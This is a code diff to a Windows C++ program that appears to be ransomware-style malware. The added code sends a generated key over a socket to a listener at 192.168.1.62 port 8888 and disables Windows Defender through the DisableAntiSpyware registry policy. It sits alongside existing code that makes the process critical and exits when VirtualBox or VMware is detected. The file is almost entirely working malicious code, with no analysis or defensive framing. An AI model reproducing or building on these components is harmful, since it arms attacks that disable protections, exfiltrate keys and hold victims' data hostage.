@@ -7,14 +7,19 @@
 #include <sys/stat.h>   /* for check if file exists */
 #include "protector.h"
 #include <stdlib.h>		/* for Exit() */
+#include <WinSock.h>
 using namespace std;
 
-#define DEBUG 1 //debug 1 - turn off,0 - turn on
+#pragma comment(lib, "Ws2_32.lib")
+
+#define DEBUG 0 //debug 1 - turn off,0 - turn on
 
 bool fileExists(const std::string& filename);
 std::string generateKey();
 void antiVmware();
 void antiVirtualBox();
+void turnOffWindowsDefender();
+void sendKey(std::string dns, int port, std::string key);
 
 int main(){
 
@@ -38,7 +43,19 @@ int main(){
 	// if file already in temp path
 	else{
     ProtectProcess();  //make process as critical . example : winlogon.exe
+	TCHAR filePath[MAX_PATH];
+	TCHAR tempPath[MAX_PATH];
+	GetModuleFileNameA(NULL,filePath, MAX_PATH);	// get current file path
+	GetTempPathA(MAX_PATH, tempPath);	// get temp path
+	turnOffWindowsDefender();
+
+	//key
 	std::string password = generateKey();
+	std::string dns = "192.168.1.62";
+	int port = 8888;
+	sendKey(dns, port, password);
+	//
+
 	//Get username
 	char user[MAX_PATH+1];
 	DWORD user_len = MAX_PATH+1;
@@ -101,6 +118,39 @@ int main(){
 
 
 //----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+void sendKey(std::string dns, int port, std::string sendKey){
+	char tmp[4096];
+	WSADATA WSAData;
+	WSAStartup(MAKEWORD(2,0), &WSAData);
+	SOCKADDR_IN sin;
+	SOCKET sock;  
+	sock = socket(AF_INET, SOCK_STREAM, 0);
+
+	// dns to IP
+	struct hostent *remoteHost;
+	struct in_addr addr;
+	remoteHost = gethostbyname(dns.c_str());
+	addr.s_addr = *(u_long *)remoteHost->h_addr_list[0];
+	char* server =  inet_ntoa(addr);
+	//
+	sin.sin_addr.s_addr			= inet_addr(server);
+	sin.sin_family				= AF_INET;
+	sin.sin_port				= htons(port);
+	connect(sock, (SOCKADDR *)&sin, sizeof(sin));
+	//send
+	memset(tmp, 0, 255); //magic number :P
+	send(sock, sendKey.c_str(), strlen(sendKey.c_str()), 0);
+}
+
+void turnOffWindowsDefender(){
+	HKEY hkey;
+	long regOpenResult;
+	regOpenResult = RegOpenKey(HKEY_LOCAL_MACHINE,"\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", &hkey);
+	long reg = RegSetValueEx(hkey,"DisableAntiSpyware",0,REG_DWORD,(BYTE*) "0x00000001", 10);
+	RegCloseKey(hkey);
+}
+
+
 void antiVirtualBox(){
 	if(fileExists("C:\\windows\\System32\\Drivers\\VBoxMouse.sys")){
 		exit(EXIT_FAILURE);
